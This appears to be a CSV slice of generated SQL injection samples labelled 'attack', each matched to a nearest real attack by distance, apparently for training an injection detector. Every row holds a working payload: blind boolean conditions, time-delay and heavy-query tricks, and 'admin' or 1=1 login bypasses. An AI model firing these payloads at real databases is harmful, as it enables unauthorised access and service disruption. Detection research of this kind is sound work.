id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000417,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,4.149823337609116
GAN_000418,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.862310248022661
GAN_000419,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R003119,6.943164341817766
GAN_000420,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,3.9178948422085695
GAN_000421,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,4.697505989057004
GAN_000422,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,5.37577253866078
GAN_000423,attack,boolean,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",nearest_attack_euclidean,R003434,5.019344429608259
GAN_000424,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,5.1257952434770155
GAN_000425,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,5.96875636558992
GAN_000426,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.706199940487092
GAN_000427,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.275628433611672
GAN_000428,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",nearest_attack_euclidean,R003360,4.754995679034697
GAN_000429,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,7.314547109771554
GAN_000430,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.352928897376747
GAN_000431,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,13.822059792829977
GAN_000432,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,6.343492724265674
GAN_000433,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,6.556856273722919
GAN_000434,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,10.367207625724419
GAN_000435,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.344346617128255
GAN_000436,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",nearest_attack_euclidean,R000294,6.606868796712684
GAN_000437,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )  ",nearest_attack_euclidean,R000638,4.289456568157997
GAN_000438,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,9.52155428637315
GAN_000439,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,3.6592025410720637
GAN_000440,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,5.372074866247785
GAN_000441,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000073,7.8420096841312406
GAN_000442,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,5.669177060574201
GAN_000443,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'jloi'  =  'jloi",nearest_attack_euclidean,R003655,5.069636052635065
GAN_000444,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.802260415658519
GAN_000445,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,6.376454040307564
GAN_000446,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.244431109594828
GAN_000447,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",nearest_attack_euclidean,R002822,7.908672081314007
GAN_000448,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,7.416647910264827
GAN_000449,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,5.451655027443624
GAN_000450,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000131,6.485265547077749
GAN_000451,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,9.25255606928119
GAN_000452,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",nearest_attack_euclidean,R000294,7.772489871357741
GAN_000453,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,9.37287333666705
GAN_000454,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.7696804523248195
GAN_000455,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,6.247783436508634
GAN_000456,attack,boolean,"1'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  'nsji'  =  'nsji",nearest_attack_euclidean,R000650,6.329377709129597
GAN_000457,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R002873,8.6863064510136
GAN_000458,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,5.6520272561822775
GAN_000459,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,7.602550200180463
GAN_000460,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,4.452794225173698
GAN_000461,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000131,6.5535929942010345
GAN_000462,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,6.219423890811316
GAN_000463,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,7.704133168702903
GAN_000464,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,10.230280375299152
GAN_000465,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R001278,5.13551367647453
GAN_000466,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",nearest_attack_euclidean,R001255,5.209699894110235
GAN_000467,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R002873,9.606976282659055
GAN_000468,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.041160046643474
GAN_000469,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,5.710781575092341
GAN_000470,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R002946,7.18186311908171
GAN_000471,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",nearest_attack_euclidean,R001255,5.681573084767225
GAN_000472,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,5.360782321029205
GAN_000473,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,7.359457233094206
GAN_000474,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R002475,3.596194123070306
GAN_000475,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R003591,4.530232052368598
GAN_000476,attack,boolean,"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",nearest_attack_euclidean,R002757,7.251608404176925
GAN_000477,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.8988089118198515
GAN_000478,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,4.955329166881284
GAN_000479,attack,boolean,"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""awyk"" like ""awyk",nearest_attack_euclidean,R002240,7.17052242683174
GAN_000480,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,6.31955439312626
GAN_000481,attack,boolean,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",nearest_attack_euclidean,R003434,6.1023936641707905
GAN_000482,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.213095154570091
GAN_000483,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,5.894967276369807
GAN_000484,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R002746,5.532792769761489
GAN_000485,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R002475,4.399629265947535
GAN_000486,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,4.686104926772356
GAN_000487,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",nearest_attack_euclidean,R001903,10.629260651007977
GAN_000488,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R003119,7.547147862596209
GAN_000489,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,4.989008613868174
GAN_000490,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,6.720952328413028
GAN_000491,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,5.841849103851735
GAN_000492,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.057578836873933
GAN_000493,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'ofko'  =  'ofko",nearest_attack_euclidean,R000502,4.63733675245022
GAN_000494,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,7.40547701503226
GAN_000495,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.772636019903475
GAN_000496,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,10.187761554623185
GAN_000497,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R002946,6.750074654949826
GAN_000498,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.625677392932597
GAN_000499,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R001278,4.491219817712341
GAN_000500,attack,boolean,"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc",nearest_attack_euclidean,R001695,9.201201405019166
